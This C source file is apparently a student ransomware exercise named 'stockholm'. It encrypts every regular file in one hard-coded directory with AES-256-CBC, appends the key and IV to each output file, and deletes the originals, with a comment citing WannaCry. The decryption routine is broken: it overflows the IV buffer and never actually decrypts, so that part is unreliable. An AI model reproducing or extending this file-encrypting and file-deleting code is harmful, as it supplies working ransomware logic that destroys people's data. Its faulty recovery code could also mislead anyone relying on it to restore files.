#include <stdio.h>
#include <string.h>
#include <dirent.h>

#include <openssl/evp.h>
#include <openssl/rand.h>

#include "stockholm.h"

int stockholm_free( FILE *in, FILE *out, EVP_CIPHER_CTX *ctx, int exit_code ) {
	if ( in != NULL )
		fclose( in );
	if ( out != NULL )
		fclose( out );
	if ( ctx != NULL )
		EVP_CIPHER_CTX_free( ctx );

	return ( exit_code );
}

int stockholm_encrypt( const char *filepath ) {
	printf( "The file that is going to be encrypted: %s\n", filepath );

	FILE *in = fopen( filepath, "rb" );
	if ( !in )
		return ( 1 );

	char outpath[4096];
	snprintf( outpath, sizeof(outpath), "%s.enc", filepath );

	FILE *out = fopen( outpath, "wb" );
	if ( !out )
		return ( stockholm_free( in, NULL, NULL, 4 ) );

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if ( !ctx )
		return ( stockholm_free( in, out, NULL, 3 ) );

	unsigned char key[32]; // 256 bits
	unsigned char iv[16];  // 128 bits (bloc AES)

	if ( RAND_bytes( key, sizeof(key) ) != 1 )
		return ( stockholm_free( in, out, ctx, 3 ) );

	if ( RAND_bytes( iv, sizeof(iv) ) != 1 )
		return ( stockholm_free( in, out, ctx, 3 ) );

	if ( !EVP_EncryptInit_ex( ctx, EVP_aes_256_cbc(), NULL, key, iv ) )
		return ( stockholm_free( in, out, ctx, 4 ) );

	unsigned char inbuf[1024], outbuf[1040];
	int inlen, outlen;

	while ( ( inlen = fread( inbuf, 1, sizeof(inbuf), in ) ) > 0 ) {
		if ( !EVP_EncryptUpdate( ctx, outbuf, &outlen, inbuf, inlen ) )
			return ( stockholm_free( in, out, ctx, 5 ) );

		if ( fwrite( outbuf, 1, outlen, out ) != ( size_t ) outlen )
			return ( stockholm_free( in, out, ctx, 6 ) );
	}

	if ( !EVP_EncryptFinal_ex( ctx, outbuf, &outlen ) )
		return ( stockholm_free( in, out, ctx, 7 ) );

	if ( fwrite( outbuf, 1, outlen, out ) != ( size_t ) outlen )
		return ( stockholm_free( in, out, ctx, 8 ) );

	EVP_CIPHER_CTX_free( ctx );
	fclose( in );

	unsigned char keyiv[48];
	// unsigned char encrypted_keyiv[256];

	memcpy( keyiv, key, 32 );
	memcpy( keyiv + 32, iv, 16 );

	// if ( fwrite( encrypted_keyiv, 1, sizeof(encrypted_keyiv), out ) != ( size_t ) sizeof(encrypted_keyiv) )
	// 	return ( stockholm_free( NULL, out, NULL, 10 ) );

	if ( fwrite( keyiv, 1, sizeof(keyiv), out ) != ( size_t ) sizeof(keyiv) )
		return ( stockholm_free( NULL, out, NULL, 10 ) );

	fclose( out );

	remove( filepath ); // Comme WannaCry : supprime le fichier original

	return ( 0 );
}

int stockholm_decrypt( const char *filepath ) {
	printf( "The file that is going to be decrypted: %s\n", filepath );

	FILE *in = fopen( filepath, "rb" );
	if ( !in )
		return ( 1 );

	char outpath[4096];
	snprintf( outpath, sizeof(outpath), "%s.dec", filepath );

	FILE *out = fopen( outpath, "wb" );
	if ( !out )
		return ( stockholm_free( in, NULL, NULL, 4 ) );

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if ( !ctx )
		return ( stockholm_free( in, out, NULL, 3 ) );

	
	unsigned char keyiv[48];

	fseek( in, -48, SEEK_END );
	fread( keyiv, 1, 48, in );

	unsigned char key[32];
	unsigned char iv[16];

	memcpy( key, keyiv, 32 );
	memcpy( iv + 32, keyiv, 16 );

	if ( !EVP_DecryptInit_ex( ctx, EVP_aes_256_cbc(), NULL, key, iv ) )
		return stockholm_free( in, out, ctx, 7 );

	return ( 0 );
}

void stockholm( const char *dirname, t_stockholm_mode type )
{
	DIR *dir = opendir( dirname ); // We only infect this directory
	if ( dir == NULL ) {
		return ;
	}

	struct dirent *entity;
	entity = readdir( dir );
	while ( entity ) {
		printf( "%hhd %s\n", entity->d_type, entity->d_name );
		// if ( entity->d_type == DT_DIR && strcmp( entity->d_name, "." ) != 0 &&strcmp( entity->d_name, ".." ) != 0 ) {
		// 	char path[4096] = { 0 }; // Max path name
		// 	strcat( path, dirname );
		// 	strcat( path, "/" );
		// 	strcat( path, entity->d_name );
		// 	stockholm( path );
		// }
		if ( entity->d_type == DT_REG ) {
			char filepath[4096] = { 0 }; // Max path name
			strcat( filepath, dirname );
			strcat( filepath, "/" );
			strcat( filepath, entity->d_name );
			if ( type == E_ENCRYPT )
				stockholm_encrypt( filepath );
			else if ( type == E_DECRYPT )
				stockholm_decrypt( filepath );
		}
		entity = readdir( dir );
	}

	closedir( dir );
}

int main( int argc, char **argv )
{
	if ( argc != 2 ) {
		printf( "Invalid number of arguments, only 2 are required !\n" );
		return ( 1 );
	}

	if ( strcmp( argv[1], "encrypt" ) == 0 ) {
		stockholm( "/home/ebonutto/infection", E_ENCRYPT );
	}

	else if ( strcmp( argv[1], "decrypt" ) == 0 ) {
		stockholm( "/home/ebonutto/infection", E_DECRYPT );
	}

	// char path[4096] = "/home/";
	// char *name;
	// strcat( path, "/ebonutto" );

	// strcat( path, $USER );
	// strcat( path, "/infection" );
	return ( 0 );
}
